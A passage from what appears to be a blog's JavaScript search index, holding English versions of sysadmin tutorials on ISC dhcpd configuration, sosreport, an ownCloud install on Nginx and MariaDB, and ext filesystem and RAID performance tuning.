case where all clients # in a certain class get addresses on the 10.17.224/24 subnet, and all # other clients get addresses on the 10.0.29/24 subnet. #class \"foo\" { # match if substring (option vendor-class-identifier, 0, 4) = \"SUNW\"; #} #shared-network 224-29 { # subnet 10.17.224.0 netmask 255.255.255.0 { # option routers rtr-224.deimos.fr; # } # subnet 10.0.29.0 netmask 255.255.255.0 { # option routers rtr-29.deimos.fr; # } # pool { # allow members of \"foo\"; # range 10.17.224.10 10.17.224.250; # } # pool { # deny members of \"foo\"; # range 10.0.29.10 10.0.29.230; # } #} Then I’ll declare the interfaces on which the dhcpd service should listen:\n# Command line options here DHCPDARGS=\"eth1 eth2\"; As I mentioned above, I have one interface per range, so we’ll add the appropriate routes:\nADDRESS1=10.102.2.32 NETMASK1=255.255.255.224 GATEWAY1=10.102.2.63 ADDRESS2=10.102.2.64 NETMASK2=255.255.255.224 GATEWAY2=10.102.2.94 Then I restart the service:\nservice restart dhcpd Example 3: FreeBSD / NetBSD linkOn FreeBSD, the configuration is similar to other versions:\n# dhcpd.conf # # Sample configuration file for ISC dhcpd # # option definitions common to all supported networks... option domain-name \"deimos.fr\"; option domain-name-servers 8.8.8.8, 192.168.10.138; default-lease-time 600; max-lease-time 7200; # Use this to enable / disable dynamic dns updates globally. ddns-update-style none; # If this DHCP server is the official DHCP server for the local # network, the authoritative directive should be uncommented. authoritative; # Allow each client to have exactly one lease, and expire # old leases if a new DHCPDISCOVER occurs one-lease-per-client true; # Tell the server to look up the host name in DNS get-lease-hostnames true; # Ping the IP address that is being offered to make sure it isn't # configured on another node. This has some potential repercussions # for clients that don't like delays. ping-check true; # Use this to send dhcp log messages to a different log file (you also # have to hack syslog.conf to complete the redirection). log-facility local7; # No service will be given on this subnet, but declaring it helps the # DHCP server to understand the network topology. #----------------------------------------- # Subnet declaration #----------------------------------------- subnet 192.168.1.0 netmask 255.255.255.0 { range 192.168.1.100 192.168.1.199; option domain-name-servers 8.8.8.8; option domain-name \"deimos.fr\"; option routers 192.168.1.254; option broadcast-address 192.168.1.255; default-lease-time 600; max-lease-time 7200; } #----------------------------------------- # Hostname declaration #----------------------------------------- #host ipad_deimos { # hardware ethernet 00:...; # fixed-address 192.168.1.90; #} #subnet 10.152.187.0 netmask 255.255.255.0 { #} # This is a very basic subnet declaration. #subnet 10.254.239.0 netmask 255.255.255.224 { # range 10.254.239.10 10.254.239.20; # option routers rtr-239-0-1.example.org, rtr-239-0-2.example.org; #} # This declaration allows BOOTP clients to get dynamic addresses, # which we don't really recommend. #subnet 10.254.239.32 netmask 255.255.255.224 { # range dynamic-bootp 10.254.239.40 10.254.239.60; # option broadcast-address 10.254.239.31; # option routers rtr-239-32-1.example.org; #} # A slightly different configuration for an internal subnet. #subnet 10.5.5.0 netmask 255.255.255.224 { # range 10.5.5.26 10.5.5.30; # option domain-name-servers ns1.internal.example.org; # option domain-name \"internal.example.org\"; # option routers 10.5.5.1; # option broadcast-address 10.5.5.31; # default-lease-time 600; # max-lease-time 7200; #} # Hosts which require special configuration options can be listed in # host statements. If no address is specified, the address will be # allocated dynamically (if possible), but the host-specific information # will still come from the host declaration. #host passacaglia { # hardware ethernet 0:0:c0:5d:bd:95; # filename \"vmunix.passacaglia\"; # server-name \"toccata.fugue.com\"; #} # Fixed IP addresses can also be specified for hosts. These addresses # should not also be listed as being available for dynamic assignment. # Hosts for which fixed IP addresses have been specified can boot using # BOOTP or DHCP. Hosts for which no fixed address is specified can only # be booted with DHCP, unless there is an address range on the subnet # to which a BOOTP client is connected which has the dynamic-bootp flag # set. #host fantasia { # hardware ethernet 08:00:07:26:c0:a5; # fixed-address fantasia.fugue.com; #} # You can declare a class of clients and then do address allocation # based on that. The example below shows a case where all clients # in a certain class get addresses on the 10.17.224/24 subnet, and all # other clients get addresses on the 10.0.29/24 subnet. #class \"foo\" { # match if substring (option vendor-class-identifier, 0, 4) = \"SUNW\"; #} #shared-network 224-29 { # subnet 10.17.224.0 netmask 255.255.255.0 { # option routers rtr-224.example.org; # } # subnet 10.0.29.0 netmask 255.255.255.0 { # option routers rtr-29.example.org; # } # pool { # allow members of \"foo\"; # range 10.17.224.10 10.17.224.250; # } # pool { # deny members of \"foo\"; # range 10.0.29.10 10.0.29.230; # } #} Since I’ve made reservations with includes and my DHCP service is chrooted, I’ll create a small directory structure that will simplify my life:\nmkdir /var/db/dhcpd/etc/dhcpd.d cd /usr/local/etc ln -s /var/db/dhcpd/etc/dhcpd.d . In there I’ll have my reservation files.\nThen to start the service:\n/usr/local/etc/rc.d/isc-dhcpd start Resources linkHow To Set Up DHCP Failover\n"
            }
        );
    index.add(
            {
                id:  272 ,
                href: "\/Sosreport:%C2%A0g%C3%A9n%C3%A9rez%C2%A0et%C2%A0analysez%C2%A0des%C2%A0rapports%C2%A0de%C2%A0machine\/",
                title: "SoSReport: Generate and analyze machine reports",
                description: "Learn how to use sosreport to generate comprehensive system reports and analyze them with sxconsole.",
                content: " Software version 2.2 Operating System Red Hat 6.4 Website Sosreport Website Last Update 15/03/2013 Others CentOS 6.4 Introduction linkIf you’ve ever contacted Red Hat support, you probably know that they systematically request a sosreport. It’s a very practical tool for the support team as it collects command results, log files, configuration files, and other information often essential for diagnosing a problem. Personally, I’ve installed it on CentOS and it works very well.\nRecently, sosreport has also been ported to Debian/Ubuntu, making it a very interesting tool when you have a heterogeneous Linux environment. It’s possible to get a quick summary of the provided information via sxconsole. The advantage of sosreport is that it collects essential information without consuming a lot of resources. Therefore, it can be executed in production environments without risking any slowdowns (depending on the production environment, of course).\nInstallation linkInstalling it is simple, as it’s part of the packages available in the base repository:\nyum install sos If you want to install sxconsole to get a summary:\nyum install sx Utilization linksosreport linkUsing it is simple. On the machine where the problem is occurring, run:\n\u003e sosreport --report sosreport (version 2.2) This utility will collect some detailed information about the hardware and setup of your CentOS system. The information is collected and an archive is packaged under /tmp, which you can send to a support representative. CentOS will use this information for diagnostic purposes ONLY and it will be considered confidential information. This process may take a while to complete. No changes will be made to your system. Press ENTER to continue or CTRL-C to quit. Please enter your first name (if you have more than one) and your last name [localhost]: Please enter the case number that you are generating this report for [None]: 123 Launching plugins. Please wait... Completed [45/45] ... Creating compressed archive... Your sosreport has been generated and saved in: /tmp/sosreport-localhost.123-20130315154819-d582.tar.xz The md5sum is: 4136a18ba7a5e7e2151203b71bc3d582 Please send this file to your support representative. The report option will generate an HTML file that can be used more easily in some cases. For the instructions to enter:\nlocalhost: ideally, enter the machine name, it’s easier to find, especially if you generate reports for multiple machines Case number: this is the ticket number. If it’s for your personal needs, you can enter anything Finally, in /tmp you’ll find an archive with all the collected information You can then easily extract them:\ntar -xaf /tmp/sosreport-localhost.123-20130315154819-d582.tar.xz sxconsole linksxconsole will generate a summary from a sysreport archive. Here’s the usage syntax:\nsxconsole -E -d -r -R ~/tmp/ ticket_number: this is the ticket number that was inserted when creating the sosreport. You can find this number in the name of the sosreport archive -E: enables all modules (cluster, storage…) -d: debug mode -r: the sosreport of a machine. If you have multiple machines, you can execute multiple -r with one machine at a time -R: this is a temporary storage directory that must be created beforehand Here’s an example using the syntax described above:\nsxconsole 123 -E -d -r /tmp/sosreport-localhost.123-20130315154819-d582.tar.xz -R ~/tmp/ References linkhttps://github.com/sosreport/sosreport\n"
            }
        );
    index.add(
            {
                id:  273 ,
                href: "\/OwnCloud_:_cr%C3%A9er_son_cloud_personnel\/",
                title: "OwnCloud: Create Your Personal Cloud",
                description: "How to set up your own personal cloud server using OwnCloud with Nginx and MariaDB",
                content: " Software version 4.5.6 Operating System Debian 7 Website ownCloud Website Last Update 26/02/2013 Others MariaDB 5.5 Introduction linkownCloud1 is an open source implementation of online storage services and various applications (cloud computing).\nThis tutorial bases the installation of ownCloud on Nginx and MariaDB.\nServer Installation linkMariaDB linkWe need to have MariaDB installed. Then, we must create a database and an account:\n\u003e mysql -uroot -p CREATE DATABASE owncloud; CREATE USER 'owncloud_user'@'localhost' IDENTIFIED BY 'owncloud_password'; GRANT USAGE ON * . * TO 'owncloud_user'@'localhost' IDENTIFIED BY 'owncloud_password'; GRANT ALL ON `owncloud`.* TO 'owncloud_user'@'localhost'; FLUSH privileges; ownCloud linkLet’s first install the dependencies:\naptitude install php5 php5-gd php-xml-parser php5-intl php5-mysql smbclient curl libcurl3 php5-curl We’ll download the latest version:\ncd /usr/share/nginx/www/ wget http://mirrors.owncloud.org/releases/owncloud-4.5.6.tar.bz2 tar -xjf owncloud-4.5.6.tar.bz2 rm -f owncloud-4.5.6.tar.bz2 chown -Rf www-data. owncloud Configuration linkNginx linkownCloud 4.X linkHere is the ownCloud 4.X configuration for Nginx:\nserver { include listen_port.conf; listen 443 default ssl; ssl on; ssl_certificate /etc/nginx/ssl/deimos.fr/server-unified.crt; ssl_certificate_key /etc/nginx/ssl/deimos.fr/server.key; server_name owncloud.deimos.fr; root /usr/share/nginx/www/deimos.fr/owncloud; index index.php; client_max_body_size 1024M; access_log /var/log/nginx/cloud.deimos.fr_access.log; error_log /var/log/nginx/cloud.deimos.fr_error.log; # Force SSL if ($scheme = http) { return 301 https://$host$request_uri; } # deny direct access location ~ ^/(data|config|\\.ht|db_structure\\.xml|README) { deny all; } # default try order location / { try_files $uri $uri/ @webdav; } # owncloud WebDAV location @webdav { fastcgi_cache mycache; fastcgi_cache_key $request_method$host$request_uri; fastcgi_cache_valid any 1h; fastcgi_split_path_info ^(.+\\.php)(/.*)$; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; fastcgi_param HTTPS on; include fastcgi_params; fastcgi_pass unix:/var/run/php5-fpm.sock; fastcgi_intercept_errors on; } location ~ \\.php$ { try_files $uri = 404; fastcgi_cache mycache; fastcgi_cache_key $request_method$host$request_uri; fastcgi_cache_valid any 1h; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; fastcgi_param HTTPS on; include fastcgi_params; fastcgi_pass unix:/var/run/php5-fpm.sock; fastcgi_intercept_errors on; } # Drop config include drop.conf; } ownCloud 5.X linkAnd for version 5:\nserver { include listen_port.conf; listen 443 default ssl; ssl on; ssl_certificate /etc/nginx/ssl/deimos.fr/server-unified.crt; ssl_certificate_key /etc/nginx/ssl/deimos.fr/server.key; server_name cloud.deimos.fr; root /usr/share/nginx/www/deimos.fr/owncloud; index index.php; client_max_body_size 1024M; access_log /var/log/nginx/cloud.deimos.fr_access.log; error_log /var/log/nginx/cloud.deimos.fr_error.log; # Force SSL if ($scheme = http) { return 301 https://$host$request_uri; } rewrite ^/caldav((/|$).*)$ /remote.php/caldav$1 last; rewrite ^/carddav((/|$).*)$ /remote.php/carddav$1 last; rewrite ^/webdav((/|$).*)$ /remote.php/webdav$1 last; error_page 403 = /core/templates/403.php; error_page 404 = /core/templates/404.php; location ~ ^/(data|config|\\.ht|db_structure\\.xml|README) { deny all; } location / { rewrite ^/.well-known/host-meta /public.php?service=host-meta last; rewrite ^/.well-known/host-meta.json /public.php?service=host-meta-json last; rewrite ^/.well-known/carddav /remote.php/carddav/ redirect; rewrite ^/.well-known/caldav /remote.php/caldav/ redirect; rewrite ^(/core/doc/[^\\/]+/)$ $1/index.html; try_files $uri $uri/ index.php; } location ~ ^(?"
            }
        );
    index.add(
            {
                id:  274 ,
                href: "\/Optimisation_des_filesystems_extX_et_du_RAID_sous_Linux\/",
                title: "Optimization of extX filesystems and RAID under Linux",
                description: "A comprehensive guide on how to optimize extX filesystems and RAID configurations on Linux systems for better performance and reliability.",
                content: " Software version Kernel 2.6.32+ Operating System Red Hat 6.3\nDebian 7 Website Kernel Website Last Update 13/02/2013 Introduction linkAll file operations on Linux are managed by VFS. The VFS layer is a common kernel interface for applications to access files. VFS handles the communication with different drivers. The inode and dentry cache is also managed by VFS. VFS is therefore capable of managing different types of filesystems, even network ones, through a common interface.\nTo see the list of loaded filesystem drivers that can be used by VFS:\n\u003e cat /proc/filesystems nodev\tsysfs nodev\trootfs nodev\tbdev nodev\tproc nodev\tcgroup nodev\tcpuset nodev\ttmpfs nodev\tdevtmpfs nodev\tdebugfs nodev\tsecurityfs nodev\tsockfs nodev\tpipefs nodev\tanon_inodefs nodev\tdevpts nodev\tramfs nodev\thugetlbfs nodev\tpstore nodev\tmqueue nodev\tusbfs ext4 nodev\tbinfmt_misc vfat ExtX link ExtX filesystems are divided into block groups, all of which have the same structure and help limit fragmentation. Each block group has its own inode table. The fact that each group manages its own table considerably reduces access times. When the kernel wants to allocate data blocks for a file, it will try to allocate them in the same block group.\nTo explain the diagram above:\nSuperblock: block group 0 contains the primary superblock, while other groups contain a backup of this superblock FS/Group descriptor: provides information about the structure of the block group Block Bitmap: used to set or clear bits for each free or in-use block. For example, with a filesystem having 4K blocks, the block group size is limited to 4096*8 blocks. Inode Bitmap: used to set or clear bits for each free or in-use inode. Inode Table: The space where inodes are stored. Each inode corresponds to 128 bytes at 8 inodes/K. As with any filesystem, the first block corresponds to the boot sector.\nFragmentation linkFragmentation is a source of significant slowdown on filesystems such as fat32, but not for extX. Although defragmentation utilities exist for extX, they are normally not necessary due to the nature of this filesystem. Fragmentation slows performance on sequential reads because the disk read head must move around significantly. The kernel takes care of rearranging data to minimize fragmentation.\nWhen a file is allocated on extX, the filesystem will pre-allocate additional space up to 8 more blocks to limit fragmentation. If this is not possible, an allocation on the same block group will be made, resulting in only minimal fragmentation.\nGetting fragmentation information linkTo see if there is fragmentation on a mounted filesystem:\n\u003e dumpe2fs /dev/sda1 Group 1: (Blocks 8193-16384) [ITABLE_ZEROED] Checksum 0x6346, unused inodes 2007 Backup Superblock at 8193, Group descriptors at 8194-8194 Reserved GDT blocks at 8195-8450 Block bitmap at 260 (bg #0 + 259), Inode bitmap at 276 (bg #0 + 275) Inode table at 542-792 (bg #0 + 541) 5872 free blocks, 2007 free inodes, 1 directory, 2007 unused inodes Free blocks: 8577-8702, 8706-9216, 10043-10044, 10235-12288, 12293-12997, 13176, 13200, 13284, 13912-16382 Free inodes: 2010-4016 Group 2: (Blocks 16385-24576) [INODE_UNINIT, ITABLE_ZEROED] Checksum 0x8215, unused inodes 2008 Block bitmap at 261 (bg #0 + 260), Inode bitmap at 277 (bg #0 + 276) Inode table at 793-1043 (bg #0 + 792) 3971 free blocks, 2008 free inodes, 0 directories, 2008 unused inodes Free blocks: 20481-20608 Free inodes: 4017-6024 At line 8: there is fragmentation because there are some non-contiguous blocks on the block group At line 15: there is no fragmentation on the block group You can use the filefrag command to see fragmentation on a file:\n\u003e filefrag -v /etc/passwd Filesystem type is: ef53 File size of /etc/passwd is 1405 (1 block, blocksize 4096) ext logical physical expected length flags 0 0 3219179 1 eof /etc/passwd: 1 extent found And for an unmounted filesystem, you know the fsck command.\nFragmentation tuning linkBy default, when you format a partition in extX, 5% of its capacity is reserved for filesystem management to prevent fragmentation. There is an option during mkfs to specify the desired percentage for this management:\nmke2fs -m If your filesystem is already created, you can change the size of this allocation:\ntune2fs -m info If you don’t use enough reserved space, you will experience performance degradation; if you use too much, you will unnecessarily waste disk space. Journals linkOne of the most important factors in performance degradation in ext3 is the journal. I should note that there are no journals in ext2. There are 3 types of journals:\nOrdered: metadata is journaled Journal: data and metadata are journaled Writeback: metadata is journaled without guarantees When a write request is made, the data to be written corresponds to both the data itself and the journals. So there are 2 writes for one request.\nTo mount a partition by choosing the journal type:\nmount -o data= On most Linux systems, ordered mode is used. In this mode, data to be written will be written in such a way that data blocks related to metadata are written to disk before metadata is written to the journal. This ensures consistency between journals and data. Any listed data present in the journal is therefore on the disk.\nThe mode where we lose the least performance in extX is writeback. In this mode, the filesystem makes no effort to order data on disk. Data is first written to the journal before being written to disk.\nWhen journaling is enabled, metadata and data are journaled. This doubles the visit counter when an internal journal is used. However, when ‘data=journal’, many small writes are combined for disk writing to achieve linear disk writing, which will improve performance and properly arrange the data.\nThe advantage of the journal is to reduce disk check time after a machine crash. And ‘data=journal’ avoids slowdowns on random writes. Journal mode is therefore the recommended mode.\nJournal tuning linkSeparate partition linkFor better performance on the journal, it is possible to enlarge it and choose the size of the blocks (which can range from 1024 to 102400). For example, here’s how to specify a size:\nmke2fs -b 4096 -J size=16 /dev/sda1 The size of the journal depends on the size of the filesystem and the write rate. If you want to gain performance, you should put the journal on a separate partition:\nData journaling is a mount option, so the journal and the filesystem must have the same block size The entire partition must be dedicated to the journal To create a journal on another partition, here’s how to do it:\nUnmount the filesystem: umount /mnt/datas Get the size of the journal: \u003e dumpe2fs /dev/sda1 | grep -i 'journal size' dumpe2fs 1.42.5 (29-Jul-2012) Journal size: 128M We can see that the journal size is 128M.\nRemove the current journal from the partition: tune2fs -f -O ^has_journal /dev/sda1 Create a new journal on another partition, which you will need to create first (so 128M): mke2fs -O journal_dev -b 4096 /dev/sdb1 Update the filesystem on the first partition to inform it of the new journal: tune2fs -j -J device=/dev/sdb1 /dev/sda1 Increase journal write periods linkThere is an option to tell the ext3/4 driver how often it should write to the journal. By default it is 5 seconds, but it is possible to increase this value, at the risk of losing data. The lower the value, the more we guarantee data integrity, but we reduce performance. If the passed value is 0, then the default 5 seconds will be used, but if you want to change this value:\nmount -o commit=15 /dev/sda1 /mnt/datas noatime linkIt is possible to disable access times on files. That is, by default, each time you access a file, the access date on the file is recorded. If there are many concurrent accesses to a partition, it can really be felt. That’s why you can disable it if this functionality is not useful to you. In your fstab, add the noatime option:\n/dev/mapper/vg-home /home ext4 defaults,noatime 0 2 It is also possible to use the same functionality for directories:\n/dev/mapper/vg-home /home ext4 defaults,noatime,nodiratime 0 2 Lock contentions linkApplications requiring exclusive access to a file typically make a lock request to determine whether it is already in use. This is generally the case for network shares to ensure that there will not be modifications in 2 places simultaneously. When an application has finished with a file, it releases the lock, which will allow other applications to access it again. Lock mechanisms are widely used by databases, for example.\nThere are 3 types of locks:\nApplication: Application locks are managed by the application and correspond to a file located somewhere on the system. It is up to the application to manage the lock system. Advisory: If you want the kernel to manage the lock system, it’s possible. However, in advisory mode, it is possible to code software to bypass this lock. Mandatory: If you want to go further and any application has the lock constraint without it being coded into the program, then you will ask the kernel to manage it. For mandatory lock on a file, you will need to use the SGID bit on the group:\nchmod g+s-x file For this to work, the partition in question must also have the option enabled:\nmount -oremount,mand /mnt/datas You can get information about kernel locks like this:\n\u003e cat /proc/locks 1: POSIX ADVISORY WRITE 24473 00:0e:250393 0 EOF 2: POSIX ADVISORY READ 23603 fd:02:1704266 128 128 3: POSIX ADVISORY READ 23603 fd:02:1704249 1073741826 1073742335 4: POSIX ADVISORY READ 23603 fd:02:1704823 1073741826 1073742335 5: POSIX ADVISORY READ 23603 fd:02:1704243 1073741826 1073742335 6: POSIX ADVISORY READ 23603 fd:02:1704259 128 128 7: POSIX ADVISORY READ 23603 fd:02:1704217 1073741826 1073742335 8: POSIX ADVISORY WRITE 23603 fd:02:1704846 0 EOF 9: POSIX ADVISORY WRITE 10347 fd:02:3015193 1073741824 1073742335 10: POSIX ADVISORY WRITE 10347 fd:02:3015194 1073741824 1073742335 11: POSIX ADVISORY READ 10347 fd:02:3015933 128 128 12: POSIX ADVISORY READ 10347 fd:02:3015252 1073741826 1073742335 13: POSIX ADVISORY READ 10347 fd:02:3015922 128 128 14: POSIX ADVISORY READ 10347 fd:02:3015240 1073741826 1073742335 15: POSIX ADVISORY WRITE 10347 fd:02:3015192 0 EOF 16: FLOCK ADVISORY WRITE 3376 fd:02:2359374 0 EOF 17: FLOCK ADVISORY WRITE 3376 fd:02:2359366 0 EOF 18: FLOCK ADVISORY WRITE 3376 fd:02:2359348 0 EOF 19: FLOCK ADVISORY WRITE 3376 fd:02:2359339 0 EOF 20: FLOCK ADVISORY WRITE 3376 fd:02:2228383 0 EOF 21: FLOCK ADVISORY WRITE 3376 fd:02:2228252 0 EOF 22: POSIX ADVISORY WRITE 3376 00:11:11525 0 EOF [...] The 6th column is read as follows: MAJOR-DEVICE:MINOR-DEVICE:INODE-NUMBER. Using the PID number, it is easy to find the process that is contending for a file (5th column). If you need to know the inode of a file:\n\u003e ls --inode file 1704256 file And conversely, if you need to find a file from an inode:\nfind / -inum -print For more information, consult the official documentation.\nRAID linkI won’t discuss different RAIDs, but will direct you to Wikipedia for that. For using software RAID under Linux, I recommend this documentation. We will focus more on performance since that’s the topic here. RAID 0 is the most performant of all RAIDs, but it obviously has data security problems when a disk is lost.\nThe MTBF (Mean Time Between Failure) is also important for RAIDs. This is an estimate of how long the RAID will function properly before a disk is detected as failing.\nChunk size linkThe “Chunk size” (or stripe size or element size for some vendors) is the number (in segments size (KiB)) of data written or read for each device before moving to another segment. The displacement algorithm used is Round Robin. The chunk size must be an integer, a multiple of the block size. The larger the chunk size, the faster the write speed on very large capacity data, but conversely it is slow on small data. If the average size of IO requests is smaller than the chunk size, the request will then be placed on a single disk of the RAID, canceling all the advantages of RAID. Reducing the chunk size will break up large files into smaller ones that will be distributed across multiple disks, which will improve performance. However, the positioning time of chunks will be reduced. Some hardware does not allow writing until a stripe is complete, canceling this positioning latency effect.\nA good rule for defining chunk size is to divide the IO operation size by the number of disks in the RAID (remove parity disks if RAID5 or 6).\ninfo Quick reminder:Raid 0: No parityRaid 1: No parityRaid 5: 1 parity diskRaid 6: 2 parity disksRaid 10: No parity disks If you have no idea about your IOs, take a value between 32KB and 128KB, taking a multiple of 2KB (or 4KB if you have larger block sizes). The chunk size (stripe size) is an important factor in your RAID performance. If the stripe is too wide, the raid may have a “hot spot” which will be the disk receiving the most IO and will reduce your RAID performance. It’s obvious that the best performance is when data is spread across all disks. So the right formula is:\nChunk size = average request IO size (avgrq-sz) / number of disks\nTo get the average request size, I invite you to check out the documentation on Systat where we talk about Iostat and Sar.\nTo see the chunk size on a RAID (here md0): \u003e cat /sys/block/md0/md/chunk_size 131072 So it’s 128KB here.\nHere’s another way to see it:\n\u003e cat /proc/mdstat Personalities : [raid10] md0 : active raid10 sdc2[3] sda2[1] sdb2[0] sdd2[2] 1949426688 blocks super 1.0 128K chunks 2 near-copies [4/4] [UUUU] unused devices: Or even:\n\u003e mdadm --detail /dev/md0 /dev/md0: Version : 1.0 Creation Time : Sat May 12 09:35:34 2012 Raid Level : raid10 Array Size : 1949426688 (1859.12 GiB 1996.21 GB) Used Dev Size : 974713344 (929.56 GiB 998.11 GB) Raid Devices : 4 Total Devices : 4 Persistence : Superblock is persistent Update Time : Thu Aug 30 12:53:20 2012 State : clean Active Devices : 4 Working Devices : 4 Failed Devices : 0 Spare Devices : 0 Layout : near=2 Chunk Size : 128K Name : N7700:2 UUID : 1a83e7dc:daa7d822:15a1de4d:e4f6fd19 Events : 64 Number Major Minor RaidDevice State 0 8 18 0 active sync /dev/sdb2 1 8 2 1 active sync /dev/sda2 2 8 50 2 active sync /dev/sdd2 3 8 34 3 active sync /dev/sdc2 It is possible to define the chunk size when creating the RAID with the -c or –chunk argument. Let’s also see how to calculate it optimally. Let’s first use iostat to get the avgrq-sz value: \u003e iostat -x sda 1 5 avg-cpu: %user %nice %system %iowait %steal %idle 0,21 0,00 0,29 0,05 0,00 99,45 Device: rrqm/s wrqm/s r/s w/s rsec/s wsec/s avgrq-sz avgqu-sz await svctm %util sda 0,71 1,25 1,23 0,76 79,29 15,22 47,55 0,01 2,84 0,73 0,14 avg-cpu: %user %nice %system %iowait %steal %idle 0,00 0,00 0,00 0,00 0,00 100,00 Device: rrqm/s wrqm/s r/s w/s rsec/s wsec/s avgrq-sz avgqu-sz await svctm %util sda 0,00 0,00 1,00 0,00 16,00 0,00 16,00 0,00 1,00 1,00 0,10 avg-cpu: %user %nice %system %iowait %steal %idle 0,00 0,00 0,00 0,00 0,00 100,00 Let’s then calculate to get the chunk size in KiB:\n\u003e echo \"47.55*512/1024\" | bc -l 23.77500000000000000000 We then need to divide this value by the number of disks (say 2) and round it to the nearest multiple of 2:\nChunk Size(KB) = 23.775/2 = 11.88 ≈ 8\nHere the chunk size to set is 8, since it’s the multiple of 2 closest to 11.88.\nwarning Remember that it is not recommended to go below 32K! To create a raid 0 by defining the chunk size:\nmdadm -C /dev/md0 -l 0 -n 2 --chunk-size=32 /dev/sd[ab]1 Stride linkStride is a parameter that is passed when building a RAID that optimizes the way the filesystem will place its data blocks on the disks before moving to the next one. With extXn you can optimize using the -E option which corresponds to the number of filesystem blocks in a chunk. To calculate the stride:\nStride = chunk size / block size\nFor a raid 0 with a chunk size of 64KiB (64 KiB / 4KiB = 16) for example:\nmkfs.ext4 -b 4096 -E stride=16 /dev/mapper/vg1-lv0 Some disk controllers do physical abstraction of block groups, making it impossible for the kernel to know them. Here’s an example to see the size of a stride:\n\u003e dumpe2fs /dev/mapper/vg1-lv0 | grep -i stride dumpe2fs 1.42 (29-Nov-2011) RAID stride: 16 Here, the size is 16 KiB.\nTo calculate the stride, there’s also a website: https://busybox.net/~aldot/mkfs_stride.html\nRound Robin linkRAIDs without parity allow data to be segmented across multiple disks to increase performance using the Round Robin algorithm. The segment size is defined when creating the RAID and refers to the chunk size.\nThe size of a RAID is defined by the smallest disk when creating the RAID. The size can vary in the future if all disks are replaced by larger capacity disks. A resynchronization of the disks will occur and the filesystem can be extended.\nSo for Round Robin tuning, you need to correctly tune the chunk size and stride for optimal use of the algorithm! That’s all :-)\nParity RAIDs linkOne of the major performance constraints of RAID 5 and 6 is parity calculation. For data to be written, the parity calculation must first be performed on the raid. Only then can the parity and data be written.\nwarning Avoid RAID 5 and 6 if writing your data represents more than 20% of the activity. Each data update requires 4 IO operations:\nThe data to be updated is first read from the disks Update of the new data (but the parity is not yet correct) Reading of blocks from the same stripe and parity calculation Final writing of new data to disks and parity In RAID 5, it is recommended to use the stripe cache:\necho 256 \u003e /sys/block/md0/md/stripe_cache_size For more information on RAID optimizations: https://kernel.org/doc/Documentation/md.txt. For the optimization part, look at the following parameters:\nchunk_size component_size new_dev safe_mode_delay syncspeed{min,max} sync_action stripe_cache_size RAID 1 linkThe RAID driver writes to the bitmap when changes have been detected since the last synchronization. A major disadvantage of RAID 1 is during a power outage, since it needs to be completely rebuilt. With the ‘write-intent’ bitmap, only the parts that have changed will need to be synchronized, which greatly reduces reconstruction time.\nIf a disk fails and is removed from the RAID, md stops erasing bits in the bitmap. If the same disk is reintroduced into the RAID, md will only need to resynchronize the difference. When creating the RAID, if the ‘–write-intent’ bitmap option is combined with ‘–write-behind’, write requests to devices with the ‘–write-mostly’ option will not wait for the requests to complete before writing to the disk. The ‘–write-behind’ option can be used for RAID1 with slow connections.\nThe new mdraid arrays support the use of write intent bitmaps. This helps the system identify problematic parts of an array; so, in case of an incorrect shutdown, only the problematic parts will need to be resynchronized, not the entire disk. This drastically reduces the time required for resynchronization. Newly created arrays will automatically have a write intent bitmap added when possible. For example, arrays used as swap and very small arrays (such as /boot arrays) will not benefit from getting write intent bitmaps. It is possible to add write intent bitmap to previously existing arrays once the device update is complete via the mdadm –grow command. However, write intent bitmaps do incur a performance impact (about 3-5% on a bitmap of size 65536, but can increase to 10% or more on smaller bitmaps, such as 8192). This means that if write intent bitmap is added to an array, it’s better to keep the size relatively large. The recommended size is 65536.\nTo see if a RAID is persistent:\n\u003e mdadm --detail /dev/md0 /dev/md0: Version : 1.0 Creation Time : Sat May 12 09:35:34 2012 Raid Level : raid10 Array Size : 1949426688 (1859.12 GiB 1996.21 GB) Used Dev Size : 974713344 (929.56 GiB 998.11 GB) Raid Devices : 4 Total Devices : 4 Persistence : Superblock is persistent Update Time : Thu Aug 30 16:43:17 2012 State : clean Active Devices : 4 Working Devices : 4 Failed Devices : 0 Spare Devices : 0 Layout : near=2 Chunk Size : 128K Name : N7700:2 UUID : 1a83e7dc:daa7d822:15a1de4d:e4f6fd19 Events : 64 Number Major Minor RaidDevice State 0 8 18 0 active sync /dev/sdb2 1 8 2 1 active sync /dev/sda2 2 8 50 2 active sync /dev/sdd2 3 8 34 3 active sync /dev/sdc2 To add the write intent bitmap (internal):\nmdadm /dev/md0 --grow --bitmap=internal To add the write intent bitmap (external):\nmdadm /dev/md0 --grow --bitmap=/mnt/my_file And to remove it:\nmdadm /dev/md0 --grow --bitmap=none To define the slow disk and the fastest one:\nmdadm -C /dev/md0 -l1 -n2 -b /tmp/md0 --write-behind=256 /dev/sdal --write-mostly /dev/sdbl References link https://www.apprenti-developpeur.net/unix-et-os/systeme-de-fichiers-sous-linux/ https://kernel.org/doc/Documentation/filesystems/mandatory-locking.txt https://fr.wikipedia.org/wiki/RAID_%28informatique%29 Configuration of a Software Raid Sysstat: Essential tools for analyzing performance issues https://kernel.org/doc/Documentation/md.txt https://makarevitch.org/rant/raid/ https://access.redhat.com/knowledge/docs/fr-FR/Red_Hat_Enterprise_Linux/6/html/Migration_Planning_Guide/chap-Migration_Guide-File_Systems.html "
            }
        );
    index.add(
            {
                id:  275 ,
                href: "\/Parted_:_r%C3%A9soudre_les_probl%C3%A8mes_de_partionnnement_sur_gros_filesystems\/",
                title: "Parted: Solving Partitioning Problems on Large Filesystems",
                description: "Guide on how to use the Parted tool to solve partitioning issues with large filesystems and disks over 2TB, with commands and examples for proper partitioning.",
